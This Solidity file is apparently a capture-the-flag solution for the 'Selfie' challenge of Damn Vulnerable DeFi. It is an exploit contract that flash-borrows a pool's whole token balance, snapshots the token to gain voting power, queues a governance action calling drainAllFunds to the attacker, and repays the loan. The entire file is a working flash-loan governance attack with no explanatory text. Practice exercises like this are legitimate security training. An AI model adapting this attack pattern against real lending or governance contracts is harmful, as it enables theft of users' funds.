// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieExploit {

    SelfiePool public immutable flashLoanPool;
    SimpleGovernance public immutable flashLoanGovernance;
    DamnValuableTokenSnapshot public immutable token;

    address public owner;
    uint256 actionId;

    constructor(
        address _owner,
        address flashLoanPoolAddress,
        address flashLoanGovernanceAddress,
        address tokenAddress
    ){
        owner = _owner;
        flashLoanPool = SelfiePool(flashLoanPoolAddress);
        flashLoanGovernance = SimpleGovernance(flashLoanGovernanceAddress);
        token = DamnValuableTokenSnapshot(tokenAddress);
    }

    function attackSetup() public {
        require(msg.sender == owner, "Only owner can exploit the target contract");
        uint256 poolBalance = token.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(poolBalance);
    }

    function attack() public {
        flashLoanGovernance.executeAction(actionId);
    }

    function receiveTokens(address _token, uint256 _borrowAmount) public {

        token.snapshot();
        actionId = flashLoanGovernance.queueAction(
            address(flashLoanPool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
            );

        ERC20Snapshot(_token).transfer(address(flashLoanPool), _borrowAmount);
    }
}